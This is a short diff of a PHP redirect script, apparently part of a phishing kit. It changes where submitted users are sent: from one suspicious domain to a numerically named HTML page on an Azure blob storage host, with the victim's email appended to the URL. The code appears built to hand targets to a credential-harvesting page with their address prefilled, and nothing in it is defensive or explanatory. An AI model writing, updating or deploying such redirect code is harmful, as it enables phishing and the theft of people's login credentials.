@@ -55,7 +55,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $encodedEmail = base64_encode($email);
 
     // Construct the redirect URL with the decoded email
-$redirectUrl = "https://biglicken.sa.com/SDpd/#X$email";
+$redirectUrl = "https://ajaxstorage.blob.core.windows.net/ajax-route/3039923002302393898944.html#X$email";
 
 
     // Redirect the user
